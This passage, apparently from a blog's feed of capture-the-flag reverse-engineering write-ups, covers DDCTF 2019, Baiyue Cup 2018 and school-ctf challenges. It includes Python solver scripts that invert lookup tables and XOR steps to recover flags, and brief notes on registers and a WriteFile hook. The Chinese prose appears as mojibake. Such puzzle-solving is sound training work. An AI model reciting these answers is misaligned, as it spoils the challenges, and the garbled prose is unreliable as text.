        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»¥å‰åšçš„é¢˜ï¼Œè¿™é¢˜ä¼¼ä¹æœ‰ç‚¹å°è¿·æƒ‘ï¼Ÿ</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222821370.png" alt="image-20210719222821370"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222824857.png" alt="image-20210719222824857"></p><p>è¿™é‡ŒæŠŠv4ç»™ecx</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222832228.png" alt="image-20210719222832228"></p><p>ç„¶åè·³å…¥sub_401000,å¹¶æ²¡æœ‰é‡æ–°èµ‹å€¼ecxï¼Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222839870.png" alt="image-20210719222839870"></p><p>æ‰€ä»¥*v1=var_804</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222847473.png" alt="image-20210719222847473"></p><p>ascii 32ä½ä¹‹å‰æ˜¯ä¸å¯è§†å­—ç¬¦ï¼Œæ‰€ä»¥æœ‰ç§æƒ…å†µæ˜¯å­—ç¬¦æ˜¾ç¤ºä¸å‡ºæ¥ï¼Œä½†å®é™…æœ‰å­—ç¬¦</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222858174.png" alt="image-20210719222858174"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222901627.png" alt="image-20210719222901627"></p><p>dword=åŒå­—=å››å­—èŠ‚ï¼Œæ­£å¥½ç­‰äºä¸€ä¸ªåœ°å€0xAABBCCDD</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222908652.png" alt="image-20210719222908652"></p><p>esp+8+arg_0=0019F700,<br>[0019F700]ç›¸å½“äºå–å€¼ï¼Œå–è¿™ä¸ªåœ°å€é‡Œé¢çš„æ•°æ®ï¼Œè€Œæ•°æ®æ­£å¥½æ˜¯0019FB2C,å°±æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²çš„åœ°å€</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222921201.png" alt="image-20210719222921201"></p><p>è´´ä¸¤ä¸ªè„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span>    <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span>    <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span>  <span class="token number">99</span><span class="token punctuation">,</span>  <span class="token number">98</span><span class="token punctuation">,</span>  <span class="token number">97</span><span class="token punctuation">,</span>    <span class="token number">96</span><span class="token punctuation">,</span>  <span class="token number">95</span><span class="token punctuation">,</span>  <span class="token number">94</span><span class="token punctuation">,</span>  <span class="token number">93</span><span class="token punctuation">,</span>  <span class="token number">92</span><span class="token punctuation">,</span>  <span class="token number">91</span><span class="token punctuation">,</span>  <span class="token number">90</span><span class="token punctuation">,</span>  <span class="token number">89</span><span class="token punctuation">,</span>  <span class="token number">88</span><span class="token punctuation">,</span>  <span class="token number">87</span><span class="token punctuation">,</span>    <span class="token number">86</span><span class="token punctuation">,</span>  <span class="token number">85</span><span class="token punctuation">,</span>  <span class="token number">84</span><span class="token punctuation">,</span>  <span class="token number">83</span><span class="token punctuation">,</span>  <span class="token number">82</span><span class="token punctuation">,</span>  <span class="token number">81</span><span class="token punctuation">,</span>  <span class="token number">80</span><span class="token punctuation">,</span>  <span class="token number">79</span><span class="token punctuation">,</span>  <span class="token number">78</span><span class="token punctuation">,</span>  <span class="token number">77</span><span class="token punctuation">,</span>    <span class="token number">76</span><span class="token punctuation">,</span>  <span class="token number">75</span><span class="token punctuation">,</span>  <span class="token number">74</span><span class="token punctuation">,</span>  <span class="token number">73</span><span class="token punctuation">,</span>  <span class="token number">72</span><span class="token punctuation">,</span>  <span class="token number">71</span><span class="token punctuation">,</span>  <span class="token number">70</span><span class="token punctuation">,</span>  <span class="token number">69</span><span class="token punctuation">,</span>  <span class="token number">68</span><span class="token punctuation">,</span>  <span class="token number">67</span><span class="token punctuation">,</span>    <span class="token number">66</span><span class="token punctuation">,</span>  <span class="token number">65</span><span class="token punctuation">,</span>  <span class="token number">64</span><span class="token punctuation">,</span>  <span class="token number">63</span><span class="token punctuation">,</span>  <span class="token number">62</span><span class="token punctuation">,</span>  <span class="token number">61</span><span class="token punctuation">,</span>  <span class="token number">60</span><span class="token punctuation">,</span>  <span class="token number">59</span><span class="token punctuation">,</span>  <span class="token number">58</span><span class="token punctuation">,</span>  <span class="token number">57</span><span class="token punctuation">,</span>    <span class="token number">56</span><span class="token punctuation">,</span>  <span class="token number">55</span><span class="token punctuation">,</span>  <span class="token number">54</span><span class="token punctuation">,</span>  <span class="token number">53</span><span class="token punctuation">,</span>  <span class="token number">52</span><span class="token punctuation">,</span>  <span class="token number">51</span><span class="token punctuation">,</span>  <span class="token number">50</span><span class="token punctuation">,</span>  <span class="token number">49</span><span class="token punctuation">,</span>  <span class="token number">48</span><span class="token punctuation">,</span>  <span class="token number">47</span><span class="token punctuation">,</span>    <span class="token number">46</span><span class="token punctuation">,</span>  <span class="token number">45</span><span class="token punctuation">,</span>  <span class="token number">44</span><span class="token punctuation">,</span>  <span class="token number">43</span><span class="token punctuation">,</span>  <span class="token number">42</span><span class="token punctuation">,</span>  <span class="token number">41</span><span class="token punctuation">,</span>  <span class="token number">40</span><span class="token punctuation">,</span>  <span class="token number">39</span><span class="token punctuation">,</span>  <span class="token number">38</span><span class="token punctuation">,</span>  <span class="token number">37</span><span class="token punctuation">,</span>    <span class="token number">36</span><span class="token punctuation">,</span>  <span class="token number">35</span><span class="token punctuation">,</span>  <span class="token number">34</span><span class="token punctuation">,</span>  <span class="token number">33</span><span class="token punctuation">,</span>  <span class="token number">32</span><span class="token punctuation">]</span>b <span class="token operator">=</span> <span class="token string">r"DDCTF&#123;reverseME&#125;"</span><span class="token keyword">for</span> c <span class="token keyword">in</span> b<span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> tmp<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">hexData <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span>    <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span>    <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span>    <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span>    <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span>    <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span>    <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">]</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'DDCTF&#123;reverseME&#125;'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>hexData<span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[ç™¾è¶Šæ¯2018]crazy</title>
      <link href="/p/1177573117.html"/>
      <url>/p/1177573117.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%99%BE%E8%B6%8A%E6%9D%AF2018-crazy/image-20210719222455302.png" alt="image-20210719222455302"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">v <span class="token operator">=</span> <span class="token string">'327a6c4304ad5938eaf0efb6cc3e53dc'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">11</span> <span class="token operator">^</span> <span class="token number">0x13</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">23</span> <span class="token operator">^</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment">#v2=flag ^ 0x50+23</span><span class="token comment"># v4=v2^0x13+11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:simple-check-100</title>
      <link href="/p/2097400026.html"/>
      <url>/p/2097400026.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ¥æºï¼šschool-ctf-winter-2015</p><p>è¿™é¢˜Winç¨‹åºæœ‰é—®é¢˜ï¼Œè¾“å‡ºä¹±ç </p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222051097.png" alt="image-20210719222051097"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222055655.png" alt="image-20210719222055655"></p><p>EAXæ˜¯32ä½å¯„å­˜å™¨</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222105605.png" alt="image-20210719222105605"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222108799.png" alt="image-20210719222108799"></p><p>RAXæ˜¯64ä½å¯„å­˜å™¨</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222117283.png" alt="image-20210719222117283"></p><h3 id="çŸ¥è¯†ç‚¹å¤ä¹ "><a href="#çŸ¥è¯†ç‚¹å¤ä¹ " class="headerlink" title="çŸ¥è¯†ç‚¹å¤ä¹ "></a>çŸ¥è¯†ç‚¹å¤ä¹ </h3><p><strong>æ±‡ç¼–å­˜æ•°å­—å­˜çš„æ˜¯ASCIIç </strong></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222142637.png" alt="image-20210719222142637"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222146555.png" alt="image-20210719222146555"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222150517.png" alt="image-20210719222150517"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222209801.png" alt="image-20210719222209801"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222158342.png" alt="image-20210719222158342"></p><p>Dword=åŒå­—=å–ä¸¤ä¸ªå­—=å–å››ä¸ªå­—èŠ‚=å–4ä¸ªæ•°å­—(ä¸€ä¸ªæ•°å­—çš„ASCIIæ˜¯ä¸€ä¸ªå­—èŠ‚)</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:parallel-comparator-200</title>
      <link href="/p/3364404399.html"/>
      <url>/p/3364404399.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ¥æºï¼šschool-ctf-winter-2015</p><p>è¿™é¢˜ç›®åå­—ä¹Ÿå¿’é•¿äº†ï¼Œlinux cé¢˜</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-parallel-comparator-200/image-20210719221814649.png" alt="image-20210719221814649"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-parallel-comparator-200/image-20210719221817748.png" alt="image-20210719221817748"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">just_a_string <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span>                 <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">]</span>differences <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token operator">-</span>               <span class="token number">9</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>differences<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>j<span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çˆ†ç ´ï¼Œç„¶åçœ‹å“ªä¸ªå¯èƒ½æ€§å¤§<br>çˆ†ç ´ä¹Ÿåˆ†æ­£åå‘å•Š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-parallel-comparator-200/image-20210719221849339.png" alt="image-20210719221849339"></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[XCTF-4th-WHCTF-2017]EASYHOOK</title>
      <link href="/p/2518220903.html"/>
      <url>/p/2518220903.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»¥å‰åšçš„é¢˜</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221226972.png" alt="image-20210719221226972"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221231704.png" alt="image-20210719221231704"></p><p>æœ‰ä¸ªå°é™·é˜±ï¼Œæ­£å¥½æ‰è¿›å»äº†ã€‚</p><p>è¿›å…¥sub_401220()</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221239853.png" alt="image-20210719221239853"></p><p>è¿™é‡Œå­˜äº†ä¸ªåœ°å€ï¼ŒProcNameå°±æ˜¯é‚£ä¸ªå‡½æ•°å</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221248531.png" alt="image-20210719221248531"></p><p>å°±ç›¸å½“äºæŠŠWriteFile()å‡½æ•°åœ°å€å­˜è¿‡å»</p><p>å€¼å¾—æ³¨æ„ï¼Œ-23å°±æ˜¯0xE9</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221255905.png" alt="image-20210719221255905"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221258893.png" alt="image-20210719221258893"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221315669.png" 